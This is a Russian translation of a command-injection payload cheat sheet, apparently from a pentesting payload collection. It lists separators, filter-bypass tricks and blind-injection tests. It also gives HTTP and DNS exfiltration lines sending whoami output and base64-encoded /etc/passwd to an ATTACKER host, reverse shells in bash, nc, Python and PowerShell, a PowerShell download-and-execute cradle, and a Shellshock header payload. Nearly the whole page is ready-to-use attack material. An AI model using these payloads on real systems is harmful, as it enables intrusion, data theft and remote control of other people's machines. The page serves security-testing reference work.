<a id="-command-injection-payloads"></a>
# 💻 Полезные нагрузки для инъекции команд

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[← Русское оглавление](../../README.ru.md) · [Английский оригинал](../Command-Injection.md)

> **Уточнение к оригиналу.** Разделители зависят от оболочки: `;` не является обычным разделителем cmd.exe, а строки с `#` в блоке cmd — пояснения оригинала, а не комментарии cmd. См. [справку Microsoft cmd](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Примеры обратных оболочек зависят от доступных программ и их сборок; исходные команды сохранены.

[🇹🇷 Türkçe Sürüm](Command-Injection.tr.md) • [🇬🇷 Ελληνικά](Command-Injection.el.md)

```
 ██████╗ ███████╗     ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ 
██╔═══██╗██╔════╝    ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗
██║   ██║███████╗    ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║
██║   ██║╚════██║    ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║
╚██████╔╝███████║    ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝
 ╚═════╝ ╚══════╝     ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ 
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗                   
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║                   
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║                   
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║                   
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║                   
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝                   
```

---

<a id="-command-separators"></a>
## 🎯 Разделители команд

<a id="linuxunix"></a>
### Linux/Unix
```bash
;       # Точка с запятой — выполнить следующую команду
|       # Канал — передать вывод следующей команде
||      # ИЛИ — выполнить при неудаче первой команды
&       # Запустить в фоновом режиме
&&      # И — выполнить при успехе первой команды
`cmd`   # Обратные кавычки — подстановка команды
$(cmd)  # Доллар — подстановка команды
\n      # Перенос строки — разделить команды
```

<a id="windows"></a>
### Windows
```cmd
;       # Иногда срабатывает
|       # Канал
||      # OR
&       # Выполнить обе команды
&&      # AND
\n      # Перенос строки
%0a     # URL-кодированный перенос строки
```

---

<a id="-basic-payloads"></a>
## 💉 Базовые полезные нагрузки

<a id="simple-test"></a>
### Простая проверка
```bash
; id
; whoami
| id
| whoami
|| id
|| whoami
& id
& whoami
&& id
&& whoami
`id`
$(id)
```

<a id="url-encoded"></a>
### URL-кодирование
```
%3B+id               # ; id
%7C+id               # | id
%7C%7C+id            # || id
%26+id               # & id
%26%26+id            # && id
%0A+id               # перенос строки + id
```

---

<a id="-blind-command-injection"></a>
## 🔥 Слепая инъекция команд

<a id="time-based-detection"></a>
### Обнаружение по задержке
```bash
# Команды задержки
; sleep 5
| sleep 5
|| sleep 5
& sleep 5
&& sleep 5
`sleep 5`
$(sleep 5)

# Windows
; ping -n 5 127.0.0.1
| timeout 5
```

<a id="dns-based-detection"></a>
### Обнаружение через DNS
```bash
# Использование nslookup
; nslookup BURP_COLLAB
| nslookup BURP_COLLAB
`nslookup BURP_COLLAB`
$(nslookup BURP_COLLAB)

# Использование curl/wget
; curl http://BURP_COLLAB
; wget http://BURP_COLLAB
$(curl http://ATTACKER/?data=$(whoami))
```

<a id="http-based-exfiltration"></a>
### Вывод данных через HTTP
```bash
; curl http://ATTACKER/$(whoami)
; curl http://ATTACKER/?d=$(cat /etc/passwd | base64)
; wget http://ATTACKER/$(hostname)
$(curl http://ATTACKER/?id=$(id))
`curl http://ATTACKER/?user=$(whoami)`
```

---

<a id="-filter-bypass-techniques"></a>
## 🛡️ Способы обхода фильтров

<a id="space-bypass"></a>
### Обход фильтра пробелов
```bash
# Использование $IFS (внутреннего разделителя полей)
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;{cat,/etc/passwd}

# Использование табуляции
;cat	/etc/passwd

# Использование фигурных скобок
{cat,/etc/passwd}
```

<a id="keyword-bypass"></a>
### Обход фильтра ключевых слов
```bash
# Разбиение команд
w'h'oami
w"h"oami
who$@ami
who\ami

# Использование подстановочных символов
/bin/ca? /etc/passwd
/bin/c?t /etc/passwd
/b??/c?t /etc/passwd

# Использование переменных
$u; cat /etc/passwd
test=cat; $test /etc/passwd

# Шестнадцатеричное кодирование
echo -e "\x69\x64" | sh    # id
```

<a id="special-character-bypass"></a>
### Обход фильтра специальных символов
```bash
# Использование разных разделителей
;{cat,/etc/passwd}
;cat</etc/passwd
;cat$IFS/etc/passwd

# Внедрение переноса строки
%0aid
%0Acat%20/etc/passwd

# Использование комментариев
; id #
| id #
```

---

<a id="-linux-payloads"></a>
## 🐧 Полезные нагрузки для Linux

<a id="file-reading"></a>
### Чтение файлов
```bash
; cat /etc/passwd
; head /etc/passwd
; tail /etc/passwd
; less /etc/passwd
; more /etc/passwd
; nl /etc/passwd
; sort /etc/passwd
; uniq /etc/passwd
; strings /etc/passwd
; od -c /etc/passwd
; xxd /etc/passwd
; base64 /etc/passwd
```

<a id="command-execution"></a>
### Выполнение команд
```bash
; id
; whoami
; uname -a
; hostname
; pwd
; ls -la
; env
; ps aux
; netstat -an
; ifconfig
; ip addr
```

<a id="reverse-shell"></a>
### Обратная оболочка (reverse shell)
```bash
; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
; nc -e /bin/sh ATTACKER 4444
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

---

<a id="-windows-payloads"></a>
## 🪟 Полезные нагрузки для Windows

<a id="basic-commands"></a>
### Базовые команды
```cmd
& whoami
& hostname
& ipconfig
& net user
& dir
& type C:\Windows\win.ini
& type C:\Windows\System32\drivers\etc\hosts
```

<a id="file-reading-1"></a>
### Чтение файлов
```cmd
& type C:\Windows\win.ini
& type C:\inetpub\wwwroot\web.config
& more C:\Windows\win.ini
& find "password" C:\path\to\file.txt
```

<a id="powershell"></a>
### PowerShell
```powershell
& powershell -c "whoami"
& powershell -c "Get-Process"
& powershell -c "IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')"
```

<a id="reverse-shell-1"></a>
### Обратная оболочка (reverse shell)
```cmd
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

<a id="-common-injection-points"></a>
## 📝 Распространённые точки внедрения

```
Параметры URL:
  ?ip=127.0.0.1;id
  ?file=test.txt|id
  ?cmd=ls

Параметры POST:
  filename=test.txt;id
  host=localhost|whoami

Заголовки:
  User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'
  X-Forwarded-For: ;id

Имена загружаемых файлов:
  test;id;.txt
  test$(id).txt
  test`id`.txt
```

---

<a id="-testing-checklist"></a>
## 📋 Список проверок

```markdown
□ Проверить все разделители команд (; | || & && ` $())
□ Проверить URL-кодированные варианты
□ Проверить слепую инъекцию по задержке
□ Проверить вывод данных через DNS/HTTP
□ Проверить обход пробелов ($IFS, табуляция, фигурные скобки)
□ Проверить обход ключевых слов (кавычки, подстановочные символы)
□ Проверить внедрение переноса строки (%0a)
□ Выяснить, какие символы фильтруются
□ Проверить команды Linux и Windows
```

---

<a id="-related-payloads"></a>
## 🔗 Связанные полезные нагрузки

- [Полезные нагрузки LFI](LFI.ru.md)
- [Полезные нагрузки SSTI](SSTI.ru.md)

---

**Вернуться к полезным нагрузкам:** [💉 Коллекция полезных нагрузок](../../README.ru.md#category-18)
